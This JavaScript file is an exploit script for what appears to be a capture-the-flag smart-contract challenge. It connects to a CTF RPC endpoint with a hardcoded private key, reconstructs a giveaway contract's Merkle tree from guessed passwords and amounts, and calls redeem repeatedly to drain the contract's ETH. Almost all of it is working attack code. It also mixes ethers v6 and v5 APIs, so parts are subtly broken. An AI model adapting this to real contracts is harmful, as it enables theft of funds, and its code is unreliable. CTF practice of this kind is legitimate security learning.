// exploit.js
const { ethers } = require("ethers")

// --- CTF Credentials & Contract Details ---
const RPC_URL =
  "http://ctf.find-it.id:6201/9144f211-6f81-47d1-94ba-c328e5553c5b"
const PRIVKEY =
  "0963ebd90fefc42d8c68f86cf59978afbd09173deec740f37c78c1b141953d5a"
const SETUP_CONTRACT_ADDR = "0x237726ac7901c9b4dc2A16dE8EA0040032A73472"
// We'll get ChovidGiveaway address from Setup contract

// --- ABIs (Minimal) ---
const setupABI = [
  "function giveaway() view returns (address)",
  "function root() view returns (bytes32)",
  "function isSolved() view returns (bool)",
]

const chovidGiveawayABI = [
  "function redeem(bytes32[] memory proof, bytes32 root, bytes memory password, uint16 amount) external",
  "function registeredRoot(bytes32 root) view returns (bool)", // For checking if root is registered
  "function redeemedPasswords(bytes32 leaf) view returns (bool)", // For debugging/checking
]

// --- Merkle Tree Logic ---

// Keccak256 hashing (ensure data is hex string for ethers)
function solidityKeccak256(types, values) {
  return ethers.utils.solidityKeccak256(types, values)
}

function keccak256(data) {
  // expects hex string
  return ethers.utils.keccak256(data)
}

// Corresponds to efficientKeccak256(bytes32 a, bytes32 b)
// which does keccak256(abi.encodePacked(a, b))
function efficientKeccak256(a_bytes32, b_bytes32) {
  // ethers.utils.concat ensures they are treated as bytes and concatenated
  return keccak256(ethers.utils.concat([a_bytes32, b_bytes32]))
}

// Corresponds to commutativeKeccak256(bytes32 a, bytes32 b)
function commutativeKeccak256(a_bytes32, b_bytes32) {
  // Convert to BigNumber for comparison, as hex strings might not compare correctly directly
  const bnA = ethers.BigNumber.from(a_bytes32)
  const bnB = ethers.BigNumber.from(b_bytes32)

  if (bnA.lt(bnB)) {
    return efficientKeccak256(a_bytes32, b_bytes32)
  } else {
    return efficientKeccak256(b_bytes32, a_bytes32)
  }
}

// Corresponds to buildTree(bytes32[] memory _leaves)
function buildTree(leaves) {
  if (!leaves || leaves.length === 0) {
    return ethers.constants.HashZero // bytes32(0)
  }
  if (leaves.length === 1) {
    return leaves[0]
  }

  let nodes = [...leaves] // Create a mutable copy
  let n = nodes.length

  while (n > 1) {
    if (n % 2 === 1) {
      // This matches the Solidity contract's revert condition
      throw new Error(
        "InvalidGiveawayLength: Number of nodes at a level is odd."
      )
    }

    let newLevelNodes = []
    for (let i = 0; i < n / 2; i++) {
      const left = nodes[2 * i]
      const right = nodes[2 * i + 1]
      const parent = commutativeKeccak256(left, right)
      newLevelNodes.push(parent)
    }
    nodes = newLevelNodes
    n = nodes.length // Or (n_old + 1) / 2 in Solidity, which for even n_old is n_old / 2
  }
  return nodes[0]
}

// Generates a Merkle proof for a leaf at a given index
function getProof(allLeaves, leafIndex) {
  if (!allLeaves || allLeaves.length === 0 || leafIndex >= allLeaves.length) {
    throw new Error("Invalid input for proof generation")
  }
  if (allLeaves.length === 1 && leafIndex === 0) {
    return [] // No proof needed for a single leaf tree if root is the leaf itself
  }

  // Ensure tree has a power-of-2 number of leaves for this simplified proof generation
  // that matches the contract's strict buildTree.
  if (
    allLeaves.length > 1 &&
    (allLeaves.length & (allLeaves.length - 1)) !== 0
  ) {
    throw new Error(
      "Proof generation expects a power-of-2 number of leaves for this simplified version."
    )
  }

  const layers = [allLeaves]
  let currentLayerNodes = [...allLeaves]
  let n = currentLayerNodes.length

  while (n > 1) {
    if (n % 2 === 1) {
      throw new Error(
        "Odd number of nodes in a layer during proof construction (should not happen for power-of-2 leaves)."
      )
    }
    const nextLevelNodes = []
    for (let i = 0; i < n / 2; i++) {
      nextLevelNodes.push(
        commutativeKeccak256(
          currentLayerNodes[2 * i],
          currentLayerNodes[2 * i + 1]
        )
      )
    }
    layers.push(nextLevelNodes)
    currentLayerNodes = nextLevelNodes
    n = currentLayerNodes.length
  }

  const proof = []
  let currentIndexInLayer = leafIndex
  for (let i = 0; i < layers.length - 1; i++) {
    // Iterate up to the layer before the root
    const currentLayer = layers[i]
    const isRightNode = currentIndexInLayer % 2 // 0 if left, 1 if right
    let siblingIndex

    if (isRightNode === 1) {
      // Current node is the right child
      siblingIndex = currentIndexInLayer - 1
    } else {
      // Current node is the left child
      siblingIndex = currentIndexInLayer + 1
    }

    if (siblingIndex < currentLayer.length) {
      proof.push(currentLayer[siblingIndex])
    } else {
      // Should not happen in a "full" power-of-2 tree
      throw new Error("Sibling index out of bounds during proof generation.")
    }
    currentIndexInLayer = Math.floor(currentIndexInLayer / 2) // Move to parent's index
  }
  return proof
}

// Creates leaf hash: keccak256(abi.encodePacked(uint24(password.length), password, amount))
function createLeafHash(passwordString, amountUint16) {
  const passwordBytes = ethers.utils.toUtf8Bytes(passwordString)
  const passwordLength = passwordBytes.length

  if (passwordLength >= 1 << 24) {
    throw new Error("Password length too large for uint24")
  }
  if (amountUint16 >= 1 << 16) {
    throw new Error("Amount too large for uint16")
  }

  // abi.encodePacked(uint24, bytes, uint16)
  // uint24: 3 bytes, uint16: 2 bytes
  // We need to pack passwordLength as 3 bytes.
  // ethers.utils.solidityPack can do this if we carefully manage types or use hex strings.

  // Manual packing of length (uint24) and amount (uint16)
  // Length (3 bytes)
  const lengthHex = ethers.utils.hexZeroPad(
    ethers.utils.hexlify(passwordLength),
    3
  )
  // Amount (2 bytes)
  const amountHex = ethers.utils.hexZeroPad(
    ethers.utils.hexlify(amountUint16),
    2
  )

  // Concatenate: length (bytes3) + password (bytes) + amount (bytes2)
  const packedData = ethers.utils.concat([
    ethers.utils.arrayify(lengthHex), // Convert hex string for length to Uint8Array
    passwordBytes, // Already Uint8Array
    ethers.utils.arrayify(amountHex), // Convert hex string for amount to Uint8Array
  ])

  return keccak256(packedData)
}

// --- Main Exploit Logic ---
async function main() {
  const provider = new ethers.JsonRpcProvider(RPC_URL)
  const wallet = new ethers.Wallet(PRIVKEY, provider)

  console.log(`Using wallet address: ${wallet.address}`)

  const setupContract = new ethers.Contract(
    SETUP_CONTRACT_ADDR,
    setupABI,
    wallet
  )
  const giveawayAddress = await setupContract.giveaway()
  console.log(`ChovidGiveaway contract address: ${giveawayAddress}`)

  const giveawayContract = new ethers.Contract(
    giveawayAddress,
    chovidGiveawayABI,
    wallet
  )

  const targetRoot = await setupContract.root()
  console.log(`Target root from Setup contract: ${targetRoot}`)

  // Hypothesis: 8 leaves. Passwords "0".."7".
  // Amounts: 65535 for first 4, 4 for the 5th, 0 for the rest.
  const assumedLeavesData = [
    { passwordStr: "0", amount: 65535, index: 0 },
    { passwordStr: "1", amount: 65535, index: 1 },
    { passwordStr: "2", amount: 65535, index: 2 },
    { passwordStr: "3", amount: 65535, index: 3 },
    { passwordStr: "4", amount: 4, index: 4 },
    { passwordStr: "5", amount: 0, index: 5 }, // Placeholder for root construction
    { passwordStr: "6", amount: 0, index: 6 }, // Placeholder
    { passwordStr: "7", amount: 0, index: 7 }, // Placeholder
  ]

  const leafHashes = assumedLeavesData.map((data) =>
    createLeafHash(data.passwordStr, data.amount)
  )
  console.log("Calculated leaf hashes based on hypothesis:")
  leafHashes.forEach((hash, i) => console.log(`  Leaf ${i}: ${hash}`))

  let reconstructedRoot
  try {
    reconstructedRoot = buildTree(leafHashes)
    console.log(`Reconstructed root from hypothesis: ${reconstructedRoot}`)
  } catch (e) {
    console.error("Error building tree with hypothesized leaves:", e.message)
    console.log(
      "This likely means the number of leaves is not a power of 2, or the hypothesis is wrong."
    )
    return
  }

  if (reconstructedRoot.toLowerCase() !== targetRoot.toLowerCase()) {
    console.error("Root mismatch! The hypothesis for leaves is incorrect.")
    console.log(`Expected: ${targetRoot}`)
    console.log(`Got:      ${reconstructedRoot}`)
    return
  }

  console.log("Root match! Proceeding with redemptions.")

  // We need to redeem the first 5 leaves
  const leavesToRedeem = assumedLeavesData.slice(0, 5)

  for (const leafData of leavesToRedeem) {
    const currentLeafHash = createLeafHash(
      leafData.passwordStr,
      leafData.amount
    ) // Re-create for clarity or use from leafHashes
    console.log(
      `\nAttempting to redeem for: password="${leafData.passwordStr}", amount=${leafData.amount}`
    )

    // Check if already redeemed (optional, for safety during testing)
    // const isRedeemed = await giveawayContract.redeemedPasswords(currentLeafHash);
    // if (isRedeemed) {
    //     console.log(`Leaf for password "${leafData.passwordStr}", amount ${leafData.amount} already redeemed. Skipping.`);
    //     continue;
    // }

    const proof = getProof(leafHashes, leafData.index)
    console.log("  Generated proof:", proof)

    try {
      const passwordBytes = ethers.utils.toUtf8Bytes(leafData.passwordStr)
      const tx = await giveawayContract.redeem(
        proof,
        targetRoot,
        passwordBytes,
        leafData.amount,
        { gasLimit: 500000 } // Set a reasonable gas limit
      )
      console.log(`  Redeem transaction sent: ${tx.hash}`)
      const receipt = await tx.wait()
      console.log(
        `  Redeem transaction confirmed. Gas used: ${receipt.gasUsed.toString()}`
      )

      const isNowSolved = await setupContract.isSolved()
      const currentBalance = await provider.getBalance(giveawayContract.address)
      console.log(
        `  Contract balance after redeem: ${ethers.utils.formatEther(
          currentBalance
        )} ETH`
      )
      console.log(`  isSolved() after redeem: ${isNowSolved}`)

      if (isNowSolved) {
        console.log("\nChallenge solved! Contract balance is zero.")
        break
      }
    } catch (error) {
      console.error(
        `  Error redeeming for password "${leafData.passwordStr}", amount ${leafData.amount}:`,
        error.reason || error.message
      )
      // If one redeem fails, we might not be able to solve it.
      // Check balances, gas, etc.
      const currentBalance = await provider.getBalance(giveawayContract.address)
      console.error(
        `  Contract balance at time of error: ${ethers.utils.formatEther(
          currentBalance
        )} ETH`
      )
      break
    }
  }

  const finalSolvedStatus = await setupContract.isSolved()
  const finalBalance = await provider.getBalance(giveawayContract.address)
  console.log(`\nFinal check - isSolved(): ${finalSolvedStatus}`)
  console.log(
    `Final contract balance: ${ethers.utils.formatEther(finalBalance)} ETH`
  )

  if (finalSolvedStatus) {
    console.log("SUCCESS: The ChovidGiveaway contract is empty!")
  } else {
    console.log(
      "FAILURE: The ChovidGiveaway contract is not empty or an error occurred."
    )
  }
}

main().catch((error) => {
  console.error("Unhandled error in main function:", error)
  process.exitCode = 1
})
